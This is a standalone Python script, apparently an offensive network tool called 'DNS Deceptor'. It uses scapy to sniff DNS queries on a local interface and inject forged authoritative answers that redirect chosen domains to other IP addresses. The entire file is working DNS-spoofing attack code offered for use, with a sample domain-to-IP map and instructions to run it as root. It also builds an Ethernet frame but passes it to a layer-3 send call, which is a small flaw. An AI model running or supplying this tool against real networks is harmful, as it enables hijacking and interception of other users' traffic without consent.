#!/usr/bin/env python3
"""
DNS Deceptor - Active DNS Spoofing Tool
Monitors DNS queries and replies with fake responses for specified domains
"""

from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send, Ether, get_if_hwaddr, ARP
from scapy.layers.l2 import getmacbyip
import sys

# ===== CONFIGURATION =====
# Target domains (domain -> fake IP)
DECOY_MAP = {
    "malware-test.com": "192.168.1.99",
    "bad-site.net": "10.0.0.1",
    "evil.com": "127.0.0.1",
}

INTERFACE = "eth0"  # Change to "wlan0" if using WiFi

def get_mac(ip):
    """Get MAC address for an IP using ARP request"""
    try:
        return getmacbyip(ip)
    except:
        return None

def forge_dns_response(pkt, qname, spoofed_ip):
    """Build a forged DNS response packet with proper MAC addresses"""
    # Get MAC addresses
    src_mac = get_if_hwaddr(INTERFACE)
    dst_mac = get_mac(pkt[IP].src)
    
    if dst_mac is None:
        dst_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast if unknown
    
    # Ethernet layer
    eth = Ether(src=src_mac, dst=dst_mac)
    
    # IP layer (swapped source/destination)
    ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    
    # UDP layer (swapped ports)
    udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    
    # DNS response layer
    dns_layer = DNS(
        id=pkt[DNS].id,
        qr=1,           # 1 = response
        aa=1,           # Authoritative Answer
        qd=pkt[DNS].qd,
        an=DNSRR(
            rrname=qname,
            type=1,     # A record type
            ttl=300,
            rdata=spoofed_ip
        )
    )
    
    return eth / ip_layer / udp_layer / dns_layer

def handle_dns_request(pkt):
    """Check each DNS packet and reply with spoofed response if domain matches"""
    if DNS in pkt and pkt[DNS].qr == 0:  # qr=0 means query
        try:
            qname = pkt[DNS].qd.qname.decode().rstrip('.')
            
            # Check if domain is in our target list
            for target, spoof_ip in DECOY_MAP.items():
                if target in qname:
                    print(f"[!] Intercepted DNS query for {qname} -> Replying with {spoof_ip}")
                    spoofed_pkt = forge_dns_response(pkt, pkt[DNS].qd, spoof_ip)
                    send(spoofed_pkt, verbose=False)
                    break
        except Exception as e:
            print(f"[-] Error: {e}")

def main():
    print("=" * 60)
    print("  DNS Deceptor - Active DNS Spoofing Tool")
    print("=" * 60)
    print(f"[*] Monitoring interface: {INTERFACE}")
    print("[*] Target domains:")
    for domain, ip in DECOY_MAP.items():
        print(f"    {domain} -> {ip}")
    print("[*] Listening for DNS queries... (Ctrl+C to stop)\n")
    
    try:
        # Capture DNS packets only (port 53)
        sniff(iface=INTERFACE, filter="udp port 53", prn=handle_dns_request, store=0)
    except PermissionError:
        print("[-] Error: Need root privileges. Run: sudo python3 dns_deceptor.py")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[+] Stopped by user.")

if __name__ == "__main__":
    main()
